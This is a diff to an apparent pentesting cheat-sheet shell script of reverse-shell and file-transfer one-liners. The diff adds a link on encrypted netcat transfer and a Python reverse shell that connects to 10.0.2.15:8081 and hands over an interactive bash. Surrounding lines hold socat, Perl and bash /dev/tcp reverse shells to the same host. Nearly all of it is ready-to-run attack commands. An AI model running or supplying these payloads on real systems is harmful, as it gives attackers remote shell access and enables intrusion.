@@ -1,5 +1,8 @@
 #!/usr/bin/env bash
 
+# Transfer with processing
+# - [netcat – encrypt transfer with openssl · GitHub](https://gist.github.com/leonklingele/d5bd28ee51a4b8e49baa)
+
 # Transfer binaries
 
 # 1. source_host
@@ -52,6 +55,8 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.2.15:8081
 # Language specific
 
 perl -e 'use Socket;$i="10.0.2.15";$p=8081;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.2.15", 8081)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/bash", "-i"]);'
 
 # https://www.gnucitizen.org/blog/reverse-shell-with-bash/
 exec 5<>/dev/tcp/10.0.2.15/8080
